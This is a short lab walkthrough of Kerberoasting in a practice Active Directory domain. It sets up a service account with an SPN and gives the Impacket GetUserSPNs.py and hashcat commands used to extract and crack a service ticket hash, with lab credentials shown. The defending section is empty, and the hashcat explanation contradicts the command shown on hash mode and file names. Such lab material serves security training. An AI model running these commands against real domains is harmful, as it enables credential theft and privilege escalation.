# Kerberoasting

## Configuring



1. Login to `DC01` with the `Administrator` user and the password `Welcome01!`.
2. Open PowerShell as administrator and execute the following commands to create a user with the name `sa_admin` and set a SPN for it:

```
net user sa_admin Welcome123456! /add
setspn -A MSSQLsvc/DC03:1433 sa_admin
```

## Attacking

### How it works



### Tools

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### Executing the attack

1. Use the discovered credentials `john` and password `Welcome2022!` with [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket to Kerberoast all roastable users.

```
python3 /opt/impacket/examples/GetUserSPNs.py 'amsterdam.bank.local/john:Welcome2022!' -dc-ip 10.0.0.2 -target-domain bank.local -outputfile kerberoast.txt
cat kerberoast.txt
```

![](<../../.gitbook/assets/image (14).png>)

2\. We retrieved one hash. Lets crack it with Hashcat and use the passwordlist we created earlier during the passwordspray. The hashcat parameters are:

* Crackingmode: `-a 0` for using a wordlist
* Hashmode: `-m 18200` for Kerberos 5, etype 23, AS-REP
* List with hashes: `kerberoasting.txt`
* Passwords list: `passwords.txt`
* Rule list: `-r rules.rule`

```
.\hashcat.exe -a 0 -m 13100 .\kerberoast.txt .\wordlists\rockyou.txt -r .\rules\dive.rule
```

![](<../../.gitbook/assets/image (34).png>)

We successfully cracked the password of the user `sa_admin`, the password is `Welcome123456!`

## Defending

### Recommendations

* a

### Detection



## References

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}
